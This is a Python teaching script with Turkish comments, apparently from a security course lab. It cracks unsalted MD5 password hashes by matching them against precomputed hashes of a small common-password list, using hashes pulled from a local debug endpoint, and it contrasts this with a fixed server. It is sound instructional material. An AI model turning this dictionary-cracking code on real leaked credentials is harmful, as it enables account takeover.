#!/usr/bin/env python3
"""
Modül 04 / Senaryo 1 — Rainbow Table Crack Demo (EĞİTİM AMAÇLI, LOKAL)

Bu script GERÇEK bir rainbow table değildir; onu KÜÇÜK ölçekte taklit eder:
küçük bir "yaygın parolalar" sözlüğündeki her parolanın MD5'ini önceden hesaplayıp
(precomputation), hedeften sızdırılan hash'lerle karşılaştırır. Aynı ders: tuzsuz +
hızlı hash → önceden hesaplanmış eşleştirmeyle anında geri çevrilir.

Kullanım:
    python crack_demo.py                      # varsayılan: http://127.0.0.1:8090 (vulnerable)
    python crack_demo.py http://127.0.0.1:8091   # fixed'e karşı (eşleşme bulunmamalı)

Yalnızca kendi lokal lab endpoint'ine (GET /debug/dump-hashes) istek atar; hiçbir
üçüncü taraf sisteme dokunmaz.
"""
import hashlib
import json
import sys
import urllib.error
import urllib.request

# Küçük, gömülü "yaygın parola" sözlüğü (mini rainbow table girdisi).
COMMON_PASSWORDS = [
    "123456", "password", "123456789", "12345678", "12345", "qwerty", "abc123",
    "111111", "1234567", "letmein", "monkey", "dragon", "1234", "baseball",
    "iloveyou", "trustno1", "sunshine", "master", "welcome", "shadow", "ashley",
    "football", "jesus", "michael", "ninja", "mustang", "password1", "123123",
    "admin", "root", "toor", "pass", "test", "guest", "qwerty123", "1q2w3e4r",
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",
    "princess", "login", "starwars", "hello", "whatever", "freedom", "batman",
]


def build_rainbow_table(words):
    """Precomputation: her parolanın MD5'ini önceden hesapla → {hash: parola}."""
    return {hashlib.md5(w.encode("utf-8")).hexdigest(): w for w in words}


def fetch_dumped_hashes(base_url):
    url = base_url.rstrip("/") + "/debug/dump-hashes"
    try:
        with urllib.request.urlopen(url, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data.get("users", []), None
    except urllib.error.HTTPError as e:
        return None, f"HTTP {e.code} ({url}) — endpoint muhtemelen kaldırılmış (fixed davranışı)."
    except urllib.error.URLError as e:
        return None, f"Bağlantı kurulamadı ({url}): {e.reason} — sunucu çalışıyor mu?"


def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8090"
    print(f"[*] Hedef: {base_url}")
    print(f"[*] Mini rainbow table hazırlanıyor ({len(COMMON_PASSWORDS)} parola)...")
    table = build_rainbow_table(COMMON_PASSWORDS)

    users, err = fetch_dumped_hashes(base_url)
    if err:
        print(f"[!] Hash dökümü alınamadı: {err}")
        print("[=] Kırılabilecek hash yok — saldırı yüzeyi kapalı görünüyor.")
        return

    print(f"[*] {len(users)} kullanıcı hash'i sızdırıldı. Eşleştiriliyor...\n")
    cracked = 0
    for u in users:
        username = u.get("username")
        h = u.get("password_hash", "")
        if h in table:
            print(f"[+] KIRILDI  {username:<8} -> {table[h]!r}  (MD5: {h})")
            cracked += 1
        else:
            # argon2/tuzlu hash veya sözlükte olmayan parola: tek bakışta eşleşmez.
            print(f"[-] kırılamadı {username:<8} (hash rainbow table ile eşleşmedi)")

    print(f"\n[=] Sonuç: {cracked}/{len(users)} parola kırıldı.")
    if cracked == 0:
        print("[=] Hiç eşleşme yok — hash'ler tuzlu/güçlü algoritmayla üretilmiş olabilir.")


if __name__ == "__main__":
    main()
